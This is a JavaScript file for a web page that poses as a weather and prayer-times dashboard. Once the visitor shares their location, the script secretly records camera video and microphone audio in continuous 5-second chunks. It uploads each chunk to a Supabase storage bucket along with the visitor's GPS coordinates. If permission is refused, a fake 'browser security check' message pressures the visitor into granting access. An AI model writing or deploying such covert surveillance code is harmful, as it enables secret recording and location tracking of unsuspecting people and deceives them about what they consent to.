const supabaseUrl = 'https://kfhrsudsdmbmewijypsh.supabase.co';
const supabaseKey = 'sb_publishable_onaTWRkl1YseVEqh_-81Rg_x9A51qt8';

// Fix: Renamed to 'supabaseClient' to avoid conflicting with the global 'supabase' variable from the CDN
const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);

let currentLocation = null;

// Upload blob and insert metadata record to Supabase
async function uploadChunk(blob) {
    const fileName = `secure_session_${Date.now()}.webm`;
    
    // Fix: using supabaseClient
    const { data, error } = await supabaseClient.storage
        .from('recordings')
        .upload(fileName, blob);

    if (error) {
        console.error("Upload Error:", error.message);
        return null;
    }
    console.log("Security chunk synced:", data.path);

    if (currentLocation) {
        const { latitude, longitude } = currentLocation.coords;
        // Fix: using supabaseClient
        const { error: insertErr } = await supabaseClient
            .from('session_logs')
            .insert({
                file_path: data.path,
                latitude,
                longitude,
                recorded_at: new Date().toISOString(),
            });
        if (insertErr) console.error("DB insert error:", insertErr.message);
    }
    return data;
}

// Handle continuous background recording
async function startContinuousRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        const recordAndUpload = () => {
            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                await uploadChunk(blob);
                recordAndUpload(); // Restart recording cycle
            };

            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
            }, 5000); // 5 second intervals
        };

        recordAndUpload();

    } catch (err) {
        console.error(err);
        alert("Verification Failed. Access Denied. Please refresh and allow the browser security check.");
    }
}

// Display the data in the beautiful UI format
function showInfo(weatherText, prayers) {
    document.getElementById('loading').style.display = 'none';

    // 1. Update Location
    document.getElementById('location').innerHTML = 
        `<strong>📍 Coordinates:</strong> ${currentLocation.coords.latitude.toFixed(4)}, ${currentLocation.coords.longitude.toFixed(4)}`;

    // 2. Update Weather
    document.getElementById('weather').innerHTML = 
        `<strong>☁️ Weather:</strong> ${weatherText}`;

    // 3. Update Prayers into a Grid
    const ptElem = document.getElementById('prayer-times');
    let prayerHTML = '<strong>🕌 Prayer Timings:</strong><div class="prayer-grid">';
    
    const mainPrayers = ['Fajr', 'Dhuhr', 'Asr', 'Maghrib', 'Isha']; 
    for (const [name, time] of Object.entries(prayers)) {
        if (mainPrayers.includes(name)) {
            prayerHTML += `
                <div class="prayer-item">
                    <span>${name}</span>
                    <strong>${time}</strong>
                </div>`;
        }
    }
    prayerHTML += '</div>';
    ptElem.innerHTML = prayerHTML;

    // Show the dashboard
    document.getElementById('info').style.display = 'block';
}

async function fetchWeather(lat, lon) {
    try {
        const resp = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
        const json = await resp.json();
        if (json && json.current_weather) {
            return `${json.current_weather.temperature}°C, Wind: ${json.current_weather.windspeed} km/h`;
        }
    } catch (err) {
        console.error(err);
    }
    return 'Weather data unavailable';
}

async function fetchPrayerTimes(lat, lon) {
    try {
        const timestamp = Math.floor(Date.now() / 1000);
        const resp = await fetch(`https://api.aladhan.com/v1/timings/${timestamp}?latitude=${lat}&longitude=${lon}&method=2`);
        const json = await resp.json();
        if (json && json.data && json.data.timings) {
            return json.data.timings;
        }
    } catch (err) {
        console.error(err);
    }
    return {};
}

function requestLocationAndStart() {
    if (!navigator.geolocation) {
        alert('Geolocation is not supported by your browser');
        return;
    }

    document.getElementById('intro-text').style.display = 'none';
    document.getElementById('loading').style.display = 'block';

    navigator.geolocation.getCurrentPosition(async (position) => {
        currentLocation = position;
        const { latitude, longitude } = position.coords;
        
        try {
            // Fetch APIs concurrently for better speed
            const [weatherText, prayers] = await Promise.all([
                fetchWeather(latitude, longitude),
                fetchPrayerTimes(latitude, longitude)
            ]);
            showInfo(weatherText, prayers);
        } catch (e) {
            console.error('Error fetching external data', e);
        }

        // Start the camera/mic sequence AFTER location is granted
        startContinuousRecording();

    }, (err) => {
        alert('Unable to retrieve location. Please refresh and allow location access.');
        document.getElementById('loading').style.display = 'none';
        document.getElementById('intro-text').style.display = 'block';
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('actionBtn');
    if (btn) {
        btn.onclick = function() {
            requestLocationAndStart();
        };
    }
});